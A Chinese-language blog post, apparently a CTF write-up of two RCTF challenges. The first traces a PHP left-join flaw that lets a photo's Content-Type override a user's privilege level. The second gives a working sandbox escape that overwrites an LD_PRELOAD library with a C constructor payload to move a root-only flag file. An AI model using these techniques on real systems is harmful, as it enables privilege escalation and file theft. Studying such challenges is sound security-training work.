---
layout: post
title: RCTF复现
tag: CTF
---
## 1.Photographer
卡了我一整天的题竟然只是小小签到，崩溃了。。  

不过这道题也是给我理清了代码审计的思路。  

来看看源码：  

根目录里有一个配置文件，有这句：

```php
DocumentRoot /var/www/html/public
```

所以我们要去/public才能看到网站的一些代码。  

看到index，看看：  

```php
$routeLoader = require __DIR__ . '/../app/config/router.php';
```

进到router看看，最关键的应该是文件上传部分的代码：

```php
$router->post('/api/photos/upload', 'PhotoController@upload');
$router->get('/api/photos/{id}/info', 'PhotoController@info');
$router->post('/api/photos/delete', 'PhotoController@delete');
```

所以我们去看PhotoController这个类。  

在这个类里有upload这个函数，观察其逻辑可以发现关键的过滤机制为isValidImage函数（代码太长不想看就丢ai  

去看isValidImage函数：  

```php

function isValidImage($file) {
    $allowedExtensions = config('upload.allowed_extensions');
    
    $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    if (!in_array($ext, $allowedExtensions)) {
        return false;
    }
    
    if ($file['size'] > config('upload.max_size')) {
        return false;
    }
    
    $imageInfo = @getimagesize($file['tmp_name']);
    if ($imageInfo === false) {
        return false;
    }
    
    return true;
}
```

这里是用了一个白名单过滤，直接防死：

```php
 'allowed_extensions' => ['jpg', 'jpeg', 'png', 'gif', 'webp']
```

去找新方法，在public目录下还有一个superadmin.php，其中

```php
if (Auth::check() && Auth::type() < $user_types['admin']) {
    echo getenv('FLAG') ?: 'RCTF{test_flag}';
```
当我们满足条件后访问这个路由就可以拿到flag。于是我们去看Auth::type是怎么得到的。

```php
public static function type() {
        return self::$user['type'];
    }
```

全局搜索self::$user

```php
public static function init() {
        if (session_status() === PHP_SESSION_NONE) {
            session_name(config('session.name'));
            session_start();
        }
        
        if (isset($_SESSION['user_id'])) {
            self::$user = User::findById($_SESSION['user_id']);
        }
    }
```
查看findById

```php
public static function findById($userId) {
        return DB::table('user')
            ->leftJoin('photo', 'user.background_photo_id', '=', 'photo.id')
            ->where('user.id', '=', $userId)
            ->first();
    }
```

这里leftjoin查询photo，会使photo.type覆盖原本的user.type，所以此时只需要将图片的Content-type改成-1，然后访问路由即可。  

## 2.rootkb

沙箱逃逸，可惜我当时不会。  

题目场景是一个允许用户执行Python代码的工具环境。  

发现`/opt/maxkb-app/sandbox/sandbox.so`这个文件是可写的。  

至此，沙箱逃逸的前提条件已经满足。  

触发机制：系统在运行用户的Python代码时，为了限制权限（沙箱化），会通过`LD_PRELOAD`环境变量强制加载`sandbox.so`这个动态链接库  

>什么是 LD_PRELOAD？ 它是 Linux 的一个环境变量，允许用户指定一个共享库（.so文件），在程序启动前优先加载。系统本意是利用这个 sandbox.so 里的逻辑来限制你的操作，但因为这个文件本身可被覆盖，攻击者就可以把它替换成恶意的 .so 文件，从而反客为主，获得代码执行权限。  

首先写出payload：

```c
#include <stdio.h>

// __attribute__((constructor)) 是 GCC 的特有语法
// 它的作用是：让 abc 函数在动态库被加载时（即 main 函数运行前）自动执行
__attribute__((constructor)) void abc(void) {
    const char *src = "/root/flag";
    const char *dst = "/opt/maxkb-app/apps/static/admin/assets/flag";
    // 将 root 目录下的 flag 文件，重命名（移动）到 Web 服务的静态资源目录下
    rename(src, dst);
}
```

>通常 Web 服务的用户权限无法直接读取 /root/flag。但是，如果加载 sandbox.so 的进程（父进程）是 Root 权限或者有足够的文件操作权限，那么注入的代码就能以高权限运行  

接下来要在本地将上面的C代码编译成动态链接库(.so文件)  

```bash
gcc -shared -fPIC exp.c -o exp.so
```

然后将生成的 exp.so 文件内容转换为 Base64 编码，以便在 Python 脚本中通过字符串形式传输  

接下来就要在自定义工具页面上传python工具

```python
import base64
import os

def fileWrite():
    # 1. 打开目标路径（原本的沙箱库文件），准备覆盖写入
    with open("/opt/maxkb-app/sandbox/sandbox.so", "wb") as f:
        # 2. 将我们在本地编译好并 base64 编码的恶意 so 文件内容写入
        f.write(base64.b64decode("实际的Base64字符串"))
    # 3. 触发加载
    # 当这里执行 os.popen 或任何系统调用时，或者当前 Python 进程本身启动时
    # 系统会根据配置尝试加载 LD_PRELOAD 指定的 sandbox.so
    # 此时加载的就是我们刚刚写入的恶意文件了
    os.popen("whoami") 
    
    return "success"
```
直接在浏览器访问`http://目标网站/static/admin/assets/flag`即可拿到flag  
